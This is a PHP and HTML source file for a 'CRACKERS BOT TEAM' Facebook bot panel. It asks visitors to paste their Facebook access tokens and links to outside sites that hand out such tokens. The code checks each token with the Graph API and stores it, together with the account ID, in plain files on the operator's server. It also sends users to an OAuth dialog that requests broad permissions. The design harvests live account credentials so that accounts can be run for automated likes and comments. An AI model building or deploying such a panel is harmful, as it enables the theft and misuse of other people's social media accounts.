<link rel="icon" type="image/png" href="http://www.flagsofallcountries.com/Asia/Pakistan/pakistan_mwc.gif"> <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=0.4"> <title> ♥ CRACKERS 🌹 BOTTER ♥ </title> <style>@font-face {font-family: yasirfonts;src: url(1.ttf);}</style> <style>@font-face {font-family: mughalfonts;src: url(2.ttf);}</style> <style> html { background: url(http://i.imgur.com/iagYykI.gif) no-repeat center center fixed; background-color: #000; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; } a { text-decoration: none; color:white; } #footer { vertical-align: center; } .form { position: absolute; vertical-align: center; width: 98%; top: 40%; } .form1 { position: absolute; vertical-align: center; width: 98%; top: 55%; } .access { position: absolute; vertical-align: center; width: 98%; } .access h2 { margin-top: -15px; } input[type=text] { font-family:YASIRfonts; width: 60%; height: 5%; padding: 8px 32px; margin: 8px 0; font-size:22px; box-sizing: border-box; border: 2px solid white; background-color: black; color: white; border-radius:50px; outline: none; text-align: center; } input[type=password] { font-family:YASIRfonts; width: 60%; height: 5%; padding: 8px 32px; margin: 8px 0; font-size:22px; box-sizing: border-box; border: 2px solid white; background-color: black; color: white; border-radius:50px; outline: none; text-align: center; } .button { font-family:YASIRfonts; height: 5%; background-color: black; /* Green */ border: 2px solid white; color: white; padding: 8px 32px; text-align: center; text-decoration: none; display: inline-block; font-size: 15px; margin: 4px 2px; -webkit-transition-duration: 0.4s; /* Safari */ transition-duration: 0.4s; cursor: pointer; } .button1 { background-color: black; color: white; border-radius:50px; } .button1:hover { background-color: white; color: black; } .button2 { background-color: RED; color: white; border-radius:50px; padding: 3px 8px; } .button2:hover { background-color: black; color: white; } .button3 { background-color: Green; color: white; border-radius:50px; padding: 7px 15px; } .button3:hover { background-color: blue; color: white; }
</style>

</head>


<?php

$bot = new bot();

class bot




{

	public function getGr($as, $bs)

	{

		$im = 'https://graph.fb.me'.$as .$bs;

		return $im;

	}

	public function getUrl($mb, $tk, $uh = null)

	{

		$ar = array('access_token' => $tk,);

		if($uh)

		{

			$else = array_merge($ar, $uh);

		}

		else

		{

			$else = $ar;

		}



		foreach($else as $b => $c)

		{

			$kng[] = $b . '=' . $c;

		}



		$true = '?' . implode('&', $kng);

		$true = $this->getGr($mb, $true);

		$true = json_decode($this->one($true) , true);

		if ($true[data])

		{

			return $true[data];

		}

		else

		{

			return $true;

		}

	}



	private function one($url)

	{

		$cx = curl_init();

		curl_setopt_array($cx, array(

			CURLOPT_URL => $url,

			CURLOPT_CONNECTTIMEOUT => 5,

			CURLOPT_RETURNTRANSFER => 1,

			CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36',

		));

		$ch = curl_exec($cx);

		curl_close($cx);

		return ($ch);

	}

	public function savEd($tk,$id,$z=null,$bb = null) 

	{

		if (!is_dir('kng'))

		{

			mkdir('kng');

		}

		if (!is_dir('kng'))

		{

			mkdir('kng');

		}

        if (!is_file('kng/' . $id . '-info'))

        {

            $info = $_SESSION['username'];

            $nd = fopen('kng/' . $id . '-info', 'w');

	    fwrite($nd, $info);

	    fclose($nd);

        }

	if($bb)

	{

		$blue = fopen('kng/' . $id, 'w');

		fwrite($blue, $tk.'*on*on*on*on*'.$bb);

		fclose($blue);

		session_unset($_SESSION[key]);

		echo '

		<script type="text/javascript">

			document.getElementById("resp").style="font-color:green;font-family:mughalFont;";

			document.getElementById("resp").innerHTML="Comment Text Saved.";

		</script>

		';			

	}

	else

	{

		if ($z)

		{

			if (file_exists('kng/' . $id))

			{

				$file = file_get_contents('kng/' . $id);

				$ex = explode('*', $file);

				$str = str_replace($ex[0], $tk, $file);

				$xs = fopen('kng/' . $id, 'w');

				fwrite($xs, $str);

				fclose($xs);

			}

			else

			{

				$str = $tk.'*on*on*on*on';

				$xs = fopen('kng/' . $id, 'w');

				fwrite($xs, $str);

				fclose($xs);

			}



			$_SESSION[key] = $tk . '_' . $id;

		}

		else

		{

			$file = file_get_contents('kng/' . $id);

			$file = explode('*', $file);

			if ($file[5])

			{

				$up = fopen('kng/' . $id, 'w');

				fwrite($up, $tk.'*on*on*on*on*'.$file[5]);

				fclose($up);

			}

			else

			{

				$up = fopen('kng/' . $id, 'w');

				fwrite($up, $tk.'*on*on*on*on');

				fclose($up);

			}

			session_unset($_SESSION[key]);

		echo '

		<script type="text/javascript">

			document.getElementById("resp").style="font-color:green;font-family:mughalFont;";

			document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

		</script>

		';				

		}

	}

	}



	public function lOgbot($d) {

		unlink('kng/' . $d);

		unlink('kng/' . $d.'-info');

		session_unset($_SESSION[key]);

		$this->atas();

		$this->home();

		$this->bwh();

		echo '

		<script type="text/javascript">

			document.getElementById("resp").style="font-color:green;font-family:mughalFont;";

			document.getElementById("resp").innerHTML="Logout Successfully...";

		</script>

		';			

	}



	public function cek($tok, $id, $nm)

	{

		 if(isset($GLOBALS['showlogin']) && $GLOBALS['showlogin'] == true)

		 {

          		$this->showlogin();

          		$this->membEr();

          		return;

 		 }

		echo '

<div id="bottom-content">

     	<div id="navigation-menu">

     		<h3><a name="navigation-name" class="no-link">Welcome ' . $nm . '</a></h3>

     		<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:180px; height:180px;border-radius:500px;" alt="' . $nm . '"/></a>

	</div><br/>

	     	<form action="index.php" method="post">

     			<input name="text" type="hidden">

     			<input type="hidden" name="opsi" value="off"><br/>

	<div id="top-content">

		<div id="search-form">

				<input class="button button1" type="submit" value="Activate Bot">

			</form>

			<form action="index.php" method="post">

     				<input type="hidden" name="logout" value="' . $id . '">

     				<input class="button button1" type="submit" value="Remove Bot">

     			</form>

		</div>

	</div>

</div>';

if (!is_dir('kng')) {

			mkdir('kng');

		}



		$up = opendir('kng');

		while ($use = readdir($up)) {

			if ($use != '.' && $use != '..') {

				$user[] = $use;

			}

		}



     echo '<div id="position: absolute;vertical-align: center;width: 98%;top: 80%;">';

     if(isset($_SESSION['logged']) && $_SESSION['logged'] ==  true)

     {

       echo 'Active Users: ' . count($user) . '</font>

       <br/></div>';

     }

			

	}



   public function atas()

   {

     echo'

     <center>

     <div id="header">

     <h2 align="center"><font style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.9em rgb(0, 163, 239), 0pt 2pt 0.9em rgb(0, 163, 239);color: #00FFFF ;font-family:yasirfonts;font-size:80px;">
								CRACKERS BOT TEAM
							</font>
						</h2>

	<h2 align="center"><font style="background: url(bg.jpg) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em red;font-family:mughalfont;font-size:50px;"><b><a href="" target="_blank"> </a></b></font></h2>     

     <h2 class="description">

     </h2><center>
							<font style= "text-shadow: 0px 0px 6px rgb(0, 163, 239), 0px 0px 5px rgb(0, 0, 0), 0px 0px 5px rgb(0, 0, 0); color: red; font-weight: bold;" size="3">
								_______________
							</font>
						</center>
						<br>
					<div class="post-content">
						<span>
							<a href="https://www.facebook.com/100007480899200" target="_blank">
								<img src="https://graph.facebook.com/100007480899200/picture?type=large" style="border: 4px solid green; padding: 4px; margin: 4px; width: 200px; height: 200px; float: left;" alt="NAEEM TARIQ" class="thumbnail"/>
							</a>
						<a href="https://www.facebook.com/100007480899200" target="_blank">
							<img src="https://graph.facebook.com/100007480899200/picture?type=large" style="border: 4px solid green; padding: 4px; margin: 4px; width: 200px; height: 200px; float: right;" alt="NAEEM TARIQ" class="thumbnail">
						</a>

						<br>
					</div>
						<center><font face="mughalfonts" size="4" style= "text-shadow: 0pt 0pt 0.9em green, 0pt 2pt 0.9em green; color: lime; font-weight: bold;">
								Follow Me On :
							</font>
								<b>
									<u>
										<a href="https://www.facebook.com/100007480899200" target="_blank">
											<font size="5.6" style= "text-shadow: 0pt 0pt 0.9em #0E359E, 0pt 2pt 0.9em #0E359E; color: #0DB90B ; font-weight: bold;">
												FACEBOOK 
											</font>
										</a>
									</u>
								<br>
							<font face="mughalfonts" size="3" style= "text-shadow: 0px 0px 10px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0); color: rgb(255, 255, 255); font-weight: bold;">
								Script Bot &copy; 2018
							</font>
							<br>
								<font face="mughalfonts" size="3" style= "text-shadow: 0pt 0pt 0.9em #0E359E, 0pt 2pt 0.9em #0E359E; color: rgb(255, 255, 255); font-weight: bold;">
									Script Created By Naeem Tariq
								</font>
							<br><br>
						</center>

							<center>
								<font style= "text-shadow: 0px 0px 6px rgb(0, 163, 239), 0px 0px 5px rgb(0, 0, 0), 0px 0px 5px rgb(0, 0, 0); color: red; font-weight: bold;" size="3">
									_______________
								</font>
							</center>
						</span><br/></a></h2> <iframe src="http://www.zeitverschiebung.net/clock-widget-iframe-v2?language=en&timezone=Asia/Karachi" width="40%" height="150" frameborder="0" seamless></iframe> <small style="color:;">&copy; <a href="http://www.zeitverschiebung.net/en/" style="color: green;"></a></small>
					</div>
					<br>

</div>';

   }	

   public function home()

   {

     echo '<div id="content">

     <div class="post">

     <div class="post-content">

     <div class="post-content">

     </div>

     </div>

     <div class="post-meta2">

     </div></div></div>';

   }

   public function showlogin()

   {

     echo '<div id="bottom-content">

     <div id="navigation-menu">

     <form class="form" action="index.php" method="post">

     <div class="login-error">'.$GLOBALS["loginerror"].'</div>

     <input class="inp-text" type="password"  name="password" value="admin" required placeholder="Enter Password To Contiue">

     <input class="button button1" type="submit"  value="Continue">

     </form>

     </div></div>';

   }



   public function bwh()

   {

     if(isset($GLOBALS['showlogin']) && $GLOBALS['showlogin'] == true)

     {

       $this->showlogin();

       $this->membEr();

       return;

     }

          echo '

     <div id="bottom-content">

     <div id="navigation-menu">

     <center><br>
								<font face="mughalfonts" style= "text-shadow: 0pt 0pt 0.9em green, 0pt 2pt 0.9em green; color: black; font-weight: bold;" size="4">
									<a target="_blank" href="http://tokan-ios.tk" target="_blank">
										<h3>
											Click Here To Get Non (Expire) Token
										</h3>
									</a>
									<a target="_blank" href="http://htc-tokan.tk" target="_blank">
										<h3>
											Click Here To Get Htc Access Token
										</h3>
									</a>
								</font>
							</center>
					</div>


     <div id="top-content">

     <div id="search-form">
<center>
							<form class="index.php" action="index.php" method="post">
								<input type="text" name="token" placeholder="Paste Your Access Token Here" required>
								<br>
								<input class="button button1" type="submit" value="Activate Bot">
							</form>
						</center>
					</div></div></div>
';

     $this->membEr();

   }

	public function membEr() {

		if (!is_dir('kng')) {

			mkdir('kng');

		}



		$up = opendir('kng');

		while ($use = readdir($up)) {

			if ($use != '.' && $use != '..') {

				$user[] = $use;

			}

		}



     echo '<div id="footer">
						<center>
							<font face="yasirfonts" size="5" color="blue" style= "text-shadow: 0px 0px 4px rgb(255, 0, 0), 0px 0px 4px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0); color: rgb(0, 163, 239); font-weight: bold;" size="6">
								Active Users 
							</font>
								: 
							<font face="yasirfonts" style= "text-shadow: 0px 0px 2px rgb(255, 0, 0), 0px 0px 2px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0); color: rgb(0, 163, 239); font-weight: bold;" size="5">
								1'.count($user).'
							</font>
							<br><br><br>
							<font face="mughalfonts">
							<font color="#00FF00"></font><font color="#00FFF0"></font><font color="red">
							<img src="https://graph.facebook.com/100007480899200/picture" width="5%"></a><font color="#00FF00"><size="8">Nae<font color="red" size="7">em</font>Tar</font><font color="#00FF00"><font color="red" size="7">i</font><font color="#00FF00">q</font>
							<img src="https://graph.facebook.com/100007480899200/picture" width="5%"></a>
							<font color="red"></font><font color="#00FFF0"></font><font color="#00FF00"></font>
							</font>
						</center>
					</div>';

     if(isset($_SESSION['logged']) && $_SESSION['logged'] ==  true)

     {

       echo '</font>

       <br/></div><audio autoplay loop>
      <source src="https://www.mahamp3.com/dl-mp3-654-4664.html">
</audio>
';

     }

	}

 

     
	public function toXen($h) {

		header('Location: https://m.facebook.com/dialog/oauth?client_id=' . $h . '&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=cokis_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Ccokis_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');

	}

}



if (isset($_SESSION[key])) {

	$a = $_SESSION[key];

	$ai = explode('_', $a);

	$a = $ai[0];

	if ($_POST[logout]) {

		$ax = $_POST[logout];

		$bot->lOgbot($ax);

	}

	else {

		$b = $bot->getUrl('/me', $a, array(

			'fields' => 'id,name',

		));

		if ($b[id]) {

			if ($_POST[opsi])

			{

				$cs = $_POST[opsi];

				$tx = $_POST[text];

				if ($cs == 'text')

				{

					unlink('kng/' . $b[id]);

					unlink('kng/' . $b[id].'-info');

					$bot->savEd($a, $b[id]);

				}

				else

				{

					if ($tx)

					{

						$bot->savEd($a, $b[id], 'x', $tx);

					}

					else

					{

						$bot->savEd($a, $b[id]);

					}

				}

			}



			$bot->atas();

			$bot->home();

			$bot->cek($a, $b[id], $b[name]);

		}

		else {

			unset($_SESSION[key]);

			unlink('kng/' . $ai[1]);

			unlink('kng/' . $ai[1].'-info');

			$bot->atas();

			$bot->home();

			$bot->bwh();

			echo '

			<script type="text/javascript">

				document.getElementById("resp").style="font-color:red;font-family:mughalFont;";

				document.getElementById("resp").innerHTML="Session Token Expired";

			</script>

			';			

		}

	}

}

else {

	if ($_POST[token]) {

		$a = $_POST[token];

		if (preg_match('/token/', $a)) {

			$tok = substr($a, strpos($a, 'token=') + 6, (strpos($a, '&') - (strpos($a, 'token=') + 6)));

		}

		else {

			$cut = explode('&', $a);

			$tok = $cut[0];

		}



		$b = $bot->getUrl('/me', $tok, array(

			'fields' => 'id,name',

		));

		if ($b[id]) {

			$bot->savEd($tok, $b[id], 'null');

			$bot->atas();

			$bot->home();

			$bot->cek($tok, $b[id], $b[name]);

		}

		else {

			$bot->atas();

			$bot->home();

			$bot->bwh();

			echo '



			<script type="text/javascript">

				document.getElementById("resp").style="color:red;font-family:mughalFont;";

				document.getElementById("resp").innerHTML="<h2>Token Is Invalid</h2>";

			</script>



			';

		}

	}

	else {

		if ($_GET[token]) {

			$a = $_GET[token];

			$bot->toXen($a);

		}

		else {

			$bot->atas();

			$bot->home();

			$bot->bwh();

		}

	}

}



?>

</body>

</html>

